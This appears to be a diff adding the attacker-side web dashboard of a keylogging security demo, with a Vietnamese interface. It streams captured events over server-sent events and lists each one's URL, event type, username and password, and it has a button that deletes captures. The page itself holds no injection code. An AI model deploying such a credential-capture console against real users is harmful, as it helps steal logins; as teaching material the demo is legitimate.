@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Attack Dashboard — Security Demo</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #0d0d0d;
+      color: #e0e0e0;
+      min-height: 100vh;
+    }
+
+    header {
+      background: #1a0000;
+      border-bottom: 2px solid #cc0000;
+      padding: 16px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    header h1 {
+      font-size: 1.4rem;
+      color: #ff3333;
+      letter-spacing: 1px;
+    }
+
+    header h1 span {
+      color: #888;
+      font-size: 0.9rem;
+      font-weight: normal;
+      margin-left: 12px;
+    }
+
+    #status-bar {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    #status-indicator {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #555;
+      display: inline-block;
+    }
+
+    #status-indicator.connected {
+      background: #00cc44;
+      box-shadow: 0 0 6px #00cc44;
+    }
+
+    #status-text {
+      font-size: 0.85rem;
+      color: #aaa;
+    }
+
+    .toolbar {
+      padding: 12px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #111;
+      border-bottom: 1px solid #222;
+    }
+
+    #event-count {
+      font-size: 0.85rem;
+      color: #888;
+    }
+
+    #btn-clear {
+      background: #330000;
+      color: #ff4444;
+      border: 1px solid #cc0000;
+      padding: 7px 18px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 0.85rem;
+      transition: background 0.2s;
+    }
+
+    #btn-clear:hover {
+      background: #550000;
+    }
+
+    .table-wrapper {
+      padding: 20px 24px;
+      overflow-x: auto;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.88rem;
+    }
+
+    thead tr {
+      background: #1a1a1a;
+      border-bottom: 2px solid #333;
+    }
+
+    thead th {
+      text-align: left;
+      padding: 10px 14px;
+      color: #aaa;
+      font-weight: 600;
+      text-transform: uppercase;
+      font-size: 0.75rem;
+      letter-spacing: 0.5px;
+    }
+
+    tbody tr {
+      border-bottom: 1px solid #1e1e1e;
+      transition: background 0.15s;
+    }
+
+    tbody tr:hover {
+      background: #161616;
+    }
+
+    tbody tr.new-row {
+      animation: highlight 0.6s ease-out;
+    }
+
+    @keyframes highlight {
+      from { background: #2a0000; }
+      to   { background: transparent; }
+    }
+
+    td {
+      padding: 10px 14px;
+      vertical-align: middle;
+      word-break: break-all;
+    }
+
+    td.col-time {
+      white-space: nowrap;
+      color: #888;
+      font-size: 0.82rem;
+    }
+
+    td.col-url {
+      max-width: 260px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      color: #ccc;
+    }
+
+    td.col-type {
+      white-space: nowrap;
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 2px 8px;
+      border-radius: 3px;
+      font-size: 0.75rem;
+      font-weight: bold;
+    }
+
+    .badge-keypress {
+      background: #1a2a00;
+      color: #88cc00;
+      border: 1px solid #446600;
+    }
+
+    .badge-submit {
+      background: #2a1a00;
+      color: #ffaa00;
+      border: 1px solid #885500;
+    }
+
+    td.col-value {
+      color: red;
+      font-weight: bold;
+      font-family: monospace;
+      font-size: 0.95rem;
+    }
+
+    #empty-state {
+      text-align: center;
+      padding: 60px 20px;
+      color: #444;
+    }
+
+    #empty-state p {
+      font-size: 1rem;
+      margin-bottom: 6px;
+    }
+
+    #empty-state small {
+      font-size: 0.8rem;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>⚠ Attack Dashboard</h1>
+  <div id="status-bar">
+    <span id="status-indicator"></span>
+    <span id="status-text">Đang kết nối...</span>
+  </div>
+</header>
+
+<div class="toolbar">
+  <span id="event-count">0 sự kiện</span>
+  <button id="btn-clear">Xóa tất cả</button>
+</div>
+
+<div class="table-wrapper">
+  <table id="capture-table">
+    <thead>
+      <tr>
+        <th>Thời gian</th>
+        <th>URL</th>
+        <th>Loại</th>
+        <th>Username</th>
+        <th>Mật khẩu</th>
+      </tr>
+    </thead>
+    <tbody id="capture-tbody">
+    </tbody>
+  </table>
+  <div id="empty-state">
+    <p>Chưa có dữ liệu nào được thu thập.</p>
+    <small>Mở Demo Page và gõ mật khẩu để xem dữ liệu xuất hiện ở đây.</small>
+  </div>
+</div>
+
+<script>
+  const tbody = document.getElementById('capture-tbody');
+  const emptyState = document.getElementById('empty-state');
+  const eventCount = document.getElementById('event-count');
+  const statusIndicator = document.getElementById('status-indicator');
+  const statusText = document.getElementById('status-text');
+  const btnClear = document.getElementById('btn-clear');
+
+  let rowCount = 0;
+
+  function formatTime(isoString) {
+    try {
+      const d = new Date(isoString);
+      return d.toLocaleTimeString('vi-VN', { hour12: false }) +
+        '.' + String(d.getMilliseconds()).padStart(3, '0');
+    } catch {
+      return isoString;
+    }
+  }
+
+  function updateCount() {
+    eventCount.textContent = rowCount + ' sự kiện';
+  }
+
+  function prependRow(event) {
+    emptyState.style.display = 'none';
+
+    const tr = document.createElement('tr');
+    tr.className = 'new-row';
+
+    const tdTime = document.createElement('td');
+    tdTime.className = 'col-time';
+    tdTime.textContent = formatTime(event.timestamp);
+
+    const tdUrl = document.createElement('td');
+    tdUrl.className = 'col-url';
+    tdUrl.textContent = event.url;
+    tdUrl.title = event.url;
+
+    const tdType = document.createElement('td');
+    tdType.className = 'col-type';
+    const badge = document.createElement('span');
+    badge.className = 'badge ' + (event.type === 'submit' ? 'badge-submit' : 'badge-keypress');
+    badge.textContent = event.type;
+    tdType.appendChild(badge);
+
+    const tdValue = document.createElement('td');
+    tdValue.className = 'col-value';
+    tdValue.textContent = event.value;
+
+    const tdUsername = document.createElement('td');
+    tdUsername.style.cssText = 'color:#64b5f6; font-family:monospace;';
+    tdUsername.textContent = event.username || '—';
+
+    tr.appendChild(tdTime);
+    tr.appendChild(tdUrl);
+    tr.appendChild(tdType);
+    tr.appendChild(tdUsername);
+    tr.appendChild(tdValue);
+
+    // Prepend: newest row at top
+    tbody.insertBefore(tr, tbody.firstChild);
+
+    rowCount++;
+    updateCount();
+  }
+
+  // SSE connection
+  const evtSource = new EventSource('/events');
+
+  evtSource.onopen = function () {
+    statusIndicator.classList.add('connected');
+    statusText.textContent = 'Đã kết nối';
+  };
+
+  evtSource.onmessage = function (e) {
+    try {
+      const event = JSON.parse(e.data);
+      prependRow(event);
+    } catch (err) {
+      // ignore malformed events
+    }
+  };
+
+  evtSource.onerror = function () {
+    statusIndicator.classList.remove('connected');
+    statusText.textContent = 'Đang kết nối lại...';
+  };
+
+  // Clear button
+  btnClear.addEventListener('click', function () {
+    fetch('/captures', { method: 'DELETE' })
+      .then(function (res) {
+        if (res.ok || res.status === 204) {
+          tbody.innerHTML = '';
+          rowCount = 0;
+          updateCount();
+          emptyState.style.display = '';
+        }
+      })
+      .catch(function (err) {
+        console.error('Xóa thất bại:', err);
+      });
+  });
+</script>
+
+</body>
+</html>
